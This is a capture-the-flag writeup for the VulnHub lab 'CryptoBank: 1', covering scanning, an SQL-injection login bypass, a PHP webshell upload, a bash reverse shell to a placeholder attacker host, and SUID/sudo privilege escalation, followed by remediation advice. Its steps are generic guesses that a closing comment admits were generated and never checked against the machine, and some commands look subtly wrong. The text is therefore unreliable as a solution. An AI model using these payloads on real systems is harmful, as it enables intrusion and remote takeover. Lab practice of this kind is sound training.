# CryptoBank: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.X (host-only) |
| **Difficulty** | Easy–Medium |
| **OS** | Linux |
| **Root Flag** | /root/flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/cryptobank-1,467/) |

## Attack Summary

nmap → web app (cryptocurrency banking) → registration/login bypass → admin panel → code execution → shell → privesc → root

## Methodology

1. Network discovery and port scan
2. Web application enumeration
3. Authentication bypass or parameter manipulation
4. Code execution via admin panel
5. Privilege escalation

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Open ports typically: 22 (SSH), 80 (HTTP), possibly 443 or 8080.

---

## Step 2: Web Enumeration

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
nikto -h http://<TARGET>/
```

The application presents a cryptocurrency banking interface. Explore registration, login, and any admin-accessible endpoints.

Check for default credentials (admin/admin, admin/password) or IDOR in user IDs.

---

## Step 3: Authentication / Authorization Bypass

Test for parameter manipulation in the registration or profile pages:

```bash
# IDOR: try changing user_id in requests
# Or test for SQLi on login
curl -X POST http://<TARGET>/login.php -d "username=admin'--&password=test"
```

Or test for improper access control on admin routes:

```bash
curl http://<TARGET>/admin/
curl http://<TARGET>/dashboard/?id=1
```

---

## Step 4: Code Execution

Once in the admin panel, look for file upload, template rendering, or system command features.

If a file upload is available:

```bash
# Upload PHP webshell
curl -X POST http://<TARGET>/admin/upload.php \
  -F "file=@shell.php;type=image/png" \
  -F "filename=shell.php"

# Trigger
curl "http://<TARGET>/uploads/shell.php?cmd=id"
```

Set up a reverse shell:

```bash
nc -lvnp 4444
curl "http://<TARGET>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER>/4444+0>%261'"
```

---

## Step 5: Privilege Escalation

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
crontab -l; cat /etc/crontab
```

Common vectors:
- SUID binaries (python, perl, find)
- Writable cron scripts
- Sudo NOPASSWD entries

```bash
# If find SUID:
find / -name flag -exec /bin/sh \;

# If sudo python:
sudo python -c 'import os; os.system("/bin/bash")'
```

```bash
cat /root/flag.txt
```

---

## Lessons Learned

1. **IDOR and parameter tampering** — validate ownership server-side for every request
2. **Admin panel file upload** — never allow untrusted files to be served by the web server
3. **SUID misconfiguration** — audit all SUID binaries regularly with `find / -perm -4000`
4. **Crypto-themed apps** often have business logic flaws around balance/transfer operations

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Authentication bypass | Use parameterized queries; implement proper session validation |
| File upload to webshell | Store outside webroot; enforce MIME type validation |
| SUID misconfig | Audit and remove unnecessary SUID bits |
| Admin panel exposure | Restrict by IP, add 2FA, move off default path |

<!-- generated from known techniques; verify against live VM -->
